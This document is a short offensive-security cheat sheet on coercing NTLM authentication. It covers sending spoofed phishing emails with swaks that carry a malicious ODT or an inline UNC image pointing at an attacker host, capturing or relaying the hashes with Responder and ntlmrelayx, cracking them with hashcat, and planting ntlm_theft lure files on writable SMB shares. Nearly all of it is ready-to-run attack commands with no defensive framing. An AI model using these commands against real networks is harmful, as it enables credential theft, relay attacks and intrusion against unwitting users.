# SMTP Malicious Attachment NTLM Coercion

Sending a malicious ODT/DOCX to an internal mailbox coerces NTLM authentication when the user opens it, because Office documents can embed UNC path references (images, frames) that trigger an outbound SMB connection.

```bash
# create a malicious ODT with an embedded UNC reference
swaks --to <victim>@<domain> --from <spoofed>@<domain> \
  --server <SMTP_HOST> \
  --header "Subject: Report" \
  --attach malicious.odt \
  --body "Please review attached report."

# alternatively: embed UNC directly (no attachment needed for some clients)
swaks --to <victim>@<domain> --from noreply@<domain> \
  --server <SMTP_HOST> \
  --body '<img src="\\<LHOST>\share\x.png">'
```

While waiting for the open/preview:
```bash
sudo responder -I <iface> -v
# or
sudo ntlmrelayx.py -t smb://<TARGET> -smb2support   # relay instead of capture
```

Craft the ODT with a UNC-referencing image tag:
```bash
# in LibreOffice, insert → Frame → link to \\<LHOST>\share\file.jpg, save as ODT
```

Hash capture → crack with `hashcat -a0 -m5600 ntlmv2.txt <WORDLIST>`.

ntlm_theft lure files on writable SMB shares — drop multiple coercion file types; any will trigger NTLMv2 when a user's Explorer renders the share:
```bash
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
python3 ntlm_theft.py -g all -s <LHOST> -f lure
# Generates: lure.scf, lure.url, lure.lnk, lure.library-ms, etc.

# Drop all files onto a writable share:
for f in lure.*; do
  smbclient //<TARGET>/<share> -U '<user>%<pass>' -c "put $f"
done
sudo responder -I <iface>   # capture NTLMv2 on connect
hashcat -a0 -m5600 captured.txt <WORDLIST>
```
